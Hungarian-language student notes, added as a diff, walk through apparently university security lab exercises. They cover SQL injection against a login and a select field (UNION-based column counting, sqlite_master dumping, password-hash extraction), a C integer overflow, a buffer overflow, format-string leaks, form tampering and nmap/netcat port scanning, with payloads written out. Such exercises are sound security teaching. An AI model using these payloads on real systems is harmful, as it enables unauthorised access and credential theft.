@@ -1,0 +1,183 @@
+1. Feladat SQL injection [Hörcsög Login] 
+
+- URL-ben átírni a GET-et megfelelő évre a végén, hogy a feladatleírásnak megkapd amit keresel.
+
+- Hogyan épül fel a lekérdezés? általában SQLite (Ha nem String a param akkor nem kell 'közzé')
+
+SELECT * FROM users WHERE userid='param1' AND password='param2'
+
+jelszó nélküli belépésre jó a ' 
+	userid: '
+	jelszo: valami'
+
+vagy ha tudjuk a nevet, id-t akármi ami kell
+	userid: jó_userid;#
+	jelszo: 
+
+1. Feladat 2.)rész 
+
+- Ha bentvagyunk, inspection a dropdown-on vagy bármilyen input mezőn ahol select van, pl táblázatok, Value értékekbe is megadhatunk SQL injectionoket. 
+
+value = "'" // Ha nem tölt be jól akkor ERROR és ez nem jó megoldás 
+
+value="' OR 1;#" //Ezzel azt várjuk, hogy az összes állatot kilistázza.
+
+- Lekérdezzük a UNION SELECT-el, hogy mennyi mezőnk van
+
+value=" ' UNION SELECT null;# " //////// Ha nem tölt be akkor HIBA. vagyis nem 1 oszlopot kérdezett le.
+value=" ' UNION SELECT null, null;# " //////// Ha nem tölt be még mindig hiba.
+növeljük a nullokat amig nem jó.... 
+value=" ' UNION SELECT null, null, null, null .... null;# " 
+//////// Ha jól betölt akkor annyi null = mezők számával.
+
+vagy megoldható az ORDER BY-al, hogy mennyi mezőnk van 
+value =" ' ORDER BY szám;# " //////// Itt átirjuk a szám értéket addig, amig az nem matchel. 
+
+---> Ha ez megvan, hogy hány mezőnk van (példa feladatban 5) akkor lekérdezzünk a masterrel a táblákat: 
+
+value=" ' UNION SELECT sql, null, null, null, null FROM sqlite_master;# "
+
+- Ezután megnézzük a keresett adatokat a táblákban, kiszedjük amikbe érdemes belenézni.
+pl: CREATE TABLE animalWelfare (id int PRIMARY KEY, owner TEXT, key TEXT, value TEXT)
+
+value=" ' UNION SELECT owner, key, value, null, null FROM animalWelfare;# " 
+//////// Ha olyat jelenit meg ammit nem tudok akkor az nem kell. Rendezni kell az utalsítást, 
+
+pl: az ownert tudjuk az előzőből, ő már nem kell, végére kerül egy null.
+value=" ' UNION SELECT key, value, null, null, null FROM animalWelfare;# "
+
+__________________________________________________________________________________________________________________
+
+1. Feladat [Háziállat]
+Ebben az egyszerű alkalmazásban bárki eltárolhatja a háziállatai adatait bejelentkezés után. Sajnos te elfelejtetted a négy karakterű jelszavadat. Ki tudod-e deríteni, mi volt az, ha tudod, hogy egy SQLite adatbázis áll az oldal mögött?
+
+NEPTUN: NEPTUN;#
+Password: valamitkitöltenirandom.
+
+Sérülékenység tesztelése: input mezőbe: ' //////// Aposztróf
+Input mezőbe: 
+' UNION SELECT null;# " //////// növeljük a nullokat amig nem jó.... általában soha nem 1
+Itt a feladatban 4.
+
+Ezután 
+' UNION SELECT sql, null, null, null FROM sqlite_master;# //////// Kilistázzuk az adatbázist.
+#2 CREATE TABLE animals (name TEXT, type TEXT, color TEXT)
+#3 CREATE TABLE datausrbb (id TEXT PRIMARY KEY, name TEXT, key TEXT)
+#4 CREATE TABLE users (id TEXT PRIMARY KEY, name TEXT, passphrase TEXT, pwd TEXT)
+kiválasztjuk a datausrbb-t
+
+' UNION SELECT id, name, key, null FROM datausrbb;#
+
+Megkapott hashelt jelszó decrypt: https://10015.io/tools/md5-encrypt-decrypt
+__________________________________________________________________________________________________________________
+
+2. Feladat meghatározni, hogy mi volt a secret0, loc.secret1 és secret2 lokális változókban az első értékadást követően tárolt érték. Az értékük a SECRET0, SECRET1 és SECRET2 makrókból van származtatva egy ismeretlen hashelési módszerrel. A forráskód (melyben nem érhető el a hash számító logika kódja) és a bináris letölthetőek. [C feladat - Egész túlcsordulás]
+
+Forráskód megnyitása egyszerűen a letöltésekből:
+menézzük az értékét a charokat, inteket stb, majd terminalban:
+
+C-Kód:
+int main() {
+
+unsigned char item = 'B' // Decimal = 66
+unsigned long item2;
+
+/*
+char arr[20]; // 20 bájt
+unsigned var3; // 4 bájt
+unsigned var4; // 4 bájt
+*/
+
+locals loc;
+getSecret1();
+printf("Provide a number:\n");
+scanf("%ul", &item2);
+item *= item2;
+if (item == 8) {
+	getSecret0();
+}
+
+printf("Provide a string again:\n");
+scanf("%s", &loc.arr);
+if(loc.var4 == 0x70707070) {
+	getSecert2();
+}
+
+return 0;
+
+}
+
+megoldás Secret0():
+man ascii
+
+ezután megnézzük a kivánt értéket amit elkell érnünk
+megnézzük, hogy milyen műveletet kell végezni (+ - * /)
+
+Hogy ne legyen túlcsordulás *= 255nek hogy legyen vagyis.
+(66 * X) mod 256 = 8
+264 mod 256 == 8
+
+(264 / 66) = 4
+4 * 66 mod 256 = 8
+
+Bináris futtatás: 
+
+cd Letöltések
+chmod +x prog
+./prog
+
+input: 4
+{vissza adja a Secret0()}
+
+megoldás Secret2
+Buffer overflow
+megnézzük, hogy mekkor a bufferünk byteba (data type length in C)
+megnézzük mi a keresett érték általában hexadecimális
+kiszámoljuk mekkora kell, hogy legyen az input
+feltöltjük a buffert és megkapjuk az értéket
+
+A(z) 0x70707070 kis p, számítás szerint ha 28 db kis p-t adunk meg
+Bináris futtatás: 
+
+cd Letöltések
+chmod +x prog
+./prog
+
+input: pppppppppppppppppppppppppppp
+{vissza adja a Secret2()}
+
+megoldás Secret1() ide más a C kód, az túl hosszú, csak videó leírásom van.
+
+illetve loc.var
+formátum string feladat
+
+%08x-el kezdődik általában
+
+megnézzük az értékeket amik segítik a keresett érték megtalálását (érték előtte és utána)
+
+a scanf-be %x. írunk, ebből kb 12 db-t pl (%x.%x.%x.%x.%x.%x.%x.%x)
+
+megkapjuk a memóriát, majd itt a követő értékeket amelyek segítik megtalálni a keresett értéket megkeressük
+
+ha megvannak akkor megvan a keresett érték
+
+esetleg lehet AAAA írni az elejére így ezeknek az értéke 41 lesz amelyek segítik a megtalálást
+
+pl (AAAA%x.%x.%x.%x.%x.%x.%x)
+__________________________________________________________________________________________________________________
+
+3. Feladat Pizza [inspection keresés feladat
+
+Megnyitjuk a devtools-t vagy jobb-click vizsgálat/inspection és átírjuk a VALUE-t a kívánt helyen majd úgy küldjük be
+__________________________________________________________________________________________________________________
+
+4. Feladat Hálózati feltérképezés [Port keresés]
+
+nmap [ip cím] -p [portok száma pl 3000-4000]
+nmap 10.124.23.10 -p 30000-65535 //Megadja az eredményt, a feladatleírásnak megfelelően kigyűjtöm a portot.
+
+nc [ip cím] [port száma]
+nc 10.124.23.10 kapottPortSzamAmitKeresek //Rácsatlakozunk és beírjuk a NEPTUN kódunkat.
+NEPTUN KÓD beírása
+amit visszaad ezt írjuk be.
+__________________________________________________________________________________________________________________
